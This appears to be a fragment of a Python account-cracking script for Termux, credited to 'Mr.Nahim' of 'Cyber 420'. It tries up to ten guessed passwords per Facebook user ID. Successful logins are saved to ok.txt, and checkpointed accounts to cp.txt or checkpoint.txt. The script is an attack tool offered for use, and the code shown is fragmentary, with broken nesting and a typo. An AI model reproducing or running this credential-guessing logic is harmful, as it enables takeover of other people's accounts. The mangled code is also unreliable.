...
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/Blueforce_Dino/.empty/node_modules/bytes/index.js"):
    ...
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Dino/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
...
\033[1;93m(!)\033[1;97m Author   : Mr.Nahim
\033[1;93m(!)\033[1;97m WHATSAPP   : +8801790104683
\033[1;93m(!)\033[1;97m Fb page  : Mr.Nahim
\033[1;93m(!)\033[1;97m From  : Cyber 420 The Silent Killer's
\033[1;97m--------------------------------------------------
"""
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[Afran/Cp] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[Afran/Cp] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[Afran/Cp] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[Afran/Cp] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[Afran/Cp] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[Afran/Cp] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[Afran/Cp] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
															                ...
															                q = json.loads(data)
															                if "loc" in q:
																                print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
																                ok = open("ok.txt","a")
																                ok.write(uid+" | "+pass8+"\n")
																                ok.close()
																                ...
																                if "www.facebook.com" in q["error"]:
																	                print("\033[1;91m[Afran/Cp] "+uid+" | "+pass8)
																	                cp = open("cp.txt","a")
																	                cp.write(uid+" | "+pass8+"\n")
																	                cp.close()
																	                cps.append(uid+pass8)
															                                ...
															                                q = json.loads(data)
															                                if "loc" in q:
																                                print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
																                                ok = open("ok.txt","a")
																                                ok.write(uid+" | "+pass9+"\n")
																                                ok.close()
																                                ...
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[Afran/Cp] "+uid+" | "+pass9)
																	                                cp = open("cp.txt","a")
																	                                cp.write(uid+" | "+pass9+"\n")
																	                                cp.close()
																	                                cps.append(uid+pass9)
															                                                ...
															                                                q = json.loads(data)
															                                                if "loc" in q:
																                                                print("\033[1;92m[Afran/Ok] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
																                                                ok = open("ok.txt","a")
																                                                ok.write(uid+" | "+pass10+"\n")
																                                                ok.close()
																                                                ...
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[Afran/Cp] "+uid+" | "+pass10)
																	                                                cp = open("cp.txt","a")
																	                                                cp.write(uid+" | "+pass10+"\n")
																	                                                cp.close()
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[Afran/Cp] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[Afran/Cp] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[Afran/Cp] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[Afran/Cp] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									                ...
									                if "loc" in q:
										                ...
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[Afran/Cp] "+uid+" | "+pass5+"\033[0;97m")
											                cp = open("checkpoint.txt","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
